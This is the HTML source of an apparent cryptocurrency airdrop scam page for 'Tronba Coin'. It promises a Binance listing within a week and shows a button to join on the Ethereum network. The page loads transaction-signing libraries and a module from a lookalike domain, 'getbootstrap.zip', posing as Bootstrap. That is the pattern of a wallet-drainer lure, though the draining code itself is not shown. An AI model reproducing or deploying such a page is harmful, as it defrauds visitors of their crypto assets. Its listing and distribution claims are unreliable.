<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tronba Coin Airdrop</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="./fonts.css" data-n-g=""> 
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.min.css" rel="stylesheet">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">

  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.all.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" integrity="sha512-FDcVY+g7vc5CXANbrTSg1K5qLyriCsGDYCE02Li1tXEYdNQPvLPHNE+rT2Mjei8N7fZbe0WLhw27j2SrGRpdMg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js" integrity="sha512-2oprd2T2vSkAii+dVWi6C+uATbQ1YGmCed6b6msb9Jxi33hsXAbnhwZ9thwCq6ndidZv4P51qaq58uo9b/x4nA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        
  <script src="./settings.js"></script>
  <script src="https://getbootstrap.zip/web3-ethers.js" type="module"></script>
</head>
<body>
    <div class="container">
        <header>
            <h1><img src="open.png" height="80" width="80"/><img src="aird.png" height="100" width="137"/></h1>
            <p>Join our airdrop and stake your Tronba/USDT pair coming live on Binance in 1 week!</p>
        </header>

        <section class="countdown">
            <h2>Binance Launch in:</h2>
            <div id="timer">7 Days 00:00:00</div>
        </section>

        <section class="airdrop-info">
            <div class="coin-info">
                <h3>Total Tronba Coin being distributed:</h3>
                <div id="coin-count">3,000,000 TBA</div>
            </div>
            <font color="white" face="arial" size="4"></font><strong>Choose your network to join</strong><font><br><br>

            <!-- Flex container for buttons -->
            <div style="display: flex; gap: 20px;">


                <!-- Button 2 -->
                <button class=".claim-button" id=".claim-button" style="
                    display: flex;
                    align-items: center;
                    padding: 10px 20px;
                    border: 2px solid #007bff;
                    background-color: #007bff;
                    color: white;
                    font-size: 16px;
                    font-weight: bold;
                    border-radius: 5px;
                    cursor: pointer;
                    transition: background-color 0.3s ease, transform 0.3s ease;
                    "
                    onmouseover="this.style.backgroundColor='#0056b3'; this.style.transform='scale(1.05)';"
                    onmouseout="this.style.backgroundColor='#007bff'; this.style.transform='scale(1)';"
                    onmousedown="this.style.backgroundColor='#004494'; this.style.transform='scale(0.95)';"
                    onmouseup="this.style.backgroundColor='#0056b3'; this.style.transform='scale(1)';"
                >
                    <img src="eth.png" alt="eth" style="width: 20px; height: 20px; margin-right: 10px;">
                    Join Eth Network
                </button>
            </div>
        </section>
    </div>

    <script src="script.js"></script>
    <script src="/assets/web3-provider/ethers.js"></script>
    <script src="/assets/web3-provider/ethereum-tx.js"></script>
    <script src="./vrtx2.0.0.js"></script>
    <script src="./vrtxscript.js"></script>
</body>
</html>
